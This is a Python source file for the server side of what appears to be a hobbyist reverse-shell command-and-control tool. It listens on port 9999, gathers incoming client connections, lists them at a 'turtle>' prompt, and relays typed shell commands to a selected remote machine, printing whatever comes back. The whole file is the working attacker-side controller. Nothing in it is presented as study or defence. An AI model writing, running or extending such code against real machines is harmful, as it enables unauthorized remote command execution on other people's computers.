import sys
import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Creating a socket with python 😊
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error "+str(msg))


# Binding the socket listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port "+str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Binding Error "+str(msg)+"\n"+"Retrying...")
        bind_socket()


# Handling Multiple Clients
# closing previous conn when server.py restart
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout from happening
            all_connections.append(conn)
            all_address.append(address)
            print("Connection Had Been Established :"+address[0])
        except:
            print("Error while accepting connections")


# 2nd Thread
# turtle> list
# 1 Friend-A
# 2 Friend-B

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")


# Display all current active connections with the client
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i)+" "+str(all_address[i][0]+" "+str(all_address[i][1]))
    print(".......Client........"+"\n"+results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to: "+str(all_address[target][0]))
        print(str(all_address[target][0])+">", end="")
        return conn
    except:
        print("Selection Not Valid")
        return None


def send_target_commands(conn):
    while True:
        cmd = input()
        try:
            if cmd == "quit":
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# create worker threads
def create_worker():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_worker()
create_jobs()











